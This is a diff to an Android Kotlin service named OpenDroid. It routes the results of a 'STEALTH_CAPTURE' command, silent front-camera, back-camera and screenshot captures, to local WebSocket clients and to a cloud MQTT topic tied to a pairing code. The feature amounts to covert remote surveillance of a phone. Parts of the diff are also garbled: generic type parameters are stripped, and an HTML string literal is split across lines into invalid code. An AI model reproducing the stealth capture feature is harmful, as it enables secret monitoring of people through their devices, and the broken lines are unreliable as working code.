@@ -55,8 +55,8 @@ class LocalFileServerService : Service() {
     private var isServerStartingOrRunning = false
     private lateinit var baseDir: File
     private var currentRingtone: Ringtone? = null
-    private val wsMessageChannel = Channel<String>(Channel.UNLIMITED)
-    private val mqttSendChannel = Channel<String>(Channel.UNLIMITED)
+    private val wsMessageChannel = Channel(Channel.UNLIMITED)
+    private val mqttSendChannel = Channel(Channel.UNLIMITED)
     private var mqttClient: MqttClient? = null
     private lateinit var teleManager: TelephonyAndLocationManager
     private var wakeLock: PowerManager.WakeLock? = null
@@ -275,6 +275,33 @@ class LocalFileServerService : Service() {
         mqttSendChannel.trySend(msg)
     }
 
+    private fun sendStealthCaptureResult(target: String, base64Data: String?, error: String?) {
+        val response = JSONObject().apply {
+            put("type", "STEALTH_CAPTURE_RESULT")
+            put("target", target)
+            put("success", error == null && base64Data != null)
+            if (base64Data != null) put("data", base64Data)
+            if (error != null) put("error", error)
+        }
+        val jsonStr = response.toString()
+
+        // 1. Send to local WebSocket clients
+        wsMessageChannel.trySend(jsonStr)
+
+        // 2. Direct send to Cloud MQTT with QoS 0 (avoids Paho QoS 1 buffer overflow on large image payloads)
+        serviceScope.launch(Dispatchers.IO) {
+            try {
+                if (mqttClient?.isConnected == true) {
+                    val mqttMsg = MqttMessage(jsonStr.toByteArray()).apply { qos = 0 }
+                    mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
+                    Log.d("StealthCapture", "Dispatched $target capture result via MQTT (qos 0)")
+                }
+            } catch (e: Exception) {
+                Log.e("StealthCapture", "Error publishing stealth capture result", e)
+            }
+        }
+    }
+
     fun sendDirectCameraFrame(base64Frame: String) {
         val json = JSONObject().apply {
             put("type", "CAMERA_FRAME")
@@ -397,7 +424,7 @@ class LocalFileServerService : Service() {
             }
 
             // =========================================================================
-            // Phase 2: Step 2.3 — Stealth Photo / Screenshot Capture
+            // Phase 2: Stealth Photo / Screenshot Capture (Direct QoS 0 Dispatch)
             // =========================================================================
             "STEALTH_CAPTURE" -> {
                 val target = json.optString("target", "FRONT").uppercase() // "FRONT", "BACK", "SCREEN"
@@ -406,53 +433,24 @@ class LocalFileServerService : Service() {
                 when (target) {
                     "SCREEN" -> {
                         stealthCaptureManager.captureScreenshot { base64Jpeg, error ->
-                            val response = JSONObject().apply {
-                                put("type", "STEALTH_CAPTURE_RESULT")
-                                put("target", "SCREEN")
-                                put("success", error == null && base64Jpeg != null)
-                                if (base64Jpeg != null) put("data", base64Jpeg)
-                                if (error != null) put("error", error)
-                            }
-                            broadcastMessage(response.toString())
-                            Log.d("StealthCapture", "Screenshot result dispatched (success: ${error == null})")
+                            sendStealthCaptureResult("SCREEN", base64Jpeg, error)
                         }
                     }
 
                     "FRONT" -> {
                         stealthCaptureManager.captureCamera(isFront = true) { base64Jpeg, error ->
-                            val response = JSONObject().apply {
-                                put("type", "STEALTH_CAPTURE_RESULT")
-                                put("target", "FRONT")
-                                put("success", error == null && base64Jpeg != null)
-                                if (base64Jpeg != null) put("data", base64Jpeg)
-                                if (error != null) put("error", error)
-                            }
-                            broadcastMessage(response.toString())
-                            Log.d("StealthCapture", "Front camera snap result dispatched (success: ${error == null})")
+                            sendStealthCaptureResult("FRONT", base64Jpeg, error)
                         }
                     }
 
                     "BACK" -> {
                         stealthCaptureManager.captureCamera(isFront = false) { base64Jpeg, error ->
-                            val response = JSONObject().apply {
-                                put("type", "STEALTH_CAPTURE_RESULT")
-                                put("target", "BACK")
-                                put("success", error == null && base64Jpeg != null)
-                                if (base64Jpeg != null) put("data", base64Jpeg)
-                                if (error != null) put("error", error)
-                            }
-                            broadcastMessage(response.toString())
-                            Log.d("StealthCapture", "Back camera snap result dispatched (success: ${error == null})")
+                            sendStealthCaptureResult("BACK", base64Jpeg, error)
                         }
                     }
 
                     else -> {
-                        broadcastMessage(JSONObject().apply {
-                            put("type", "STEALTH_CAPTURE_RESULT")
-                            put("target", target)
-                            put("success", false)
-                            put("error", "Invalid capture target: $target")
-                        }.toString())
+                        sendStealthCaptureResult(target, null, "Invalid capture target: $target")
                     }
                 }
             }
@@ -800,7 +798,9 @@ class LocalFileServerService : Service() {
                 val html = try {
                     assets.open("index.html").bufferedReader().use { it.readText() }
                 } catch (e: Exception) {
-                    "<html><body><h1>OpenDroid Server Running</h1></body></html>"
+                    "
+OpenDroid Server Running
+"
                 }
                 call.respondText(html, ContentType.Text.Html)
             }
@@ -888,3 +888,5 @@ class LocalFileServerService : Service() {
 
     override fun onBind(intent: Intent?): IBinder? = null
 }
+
+
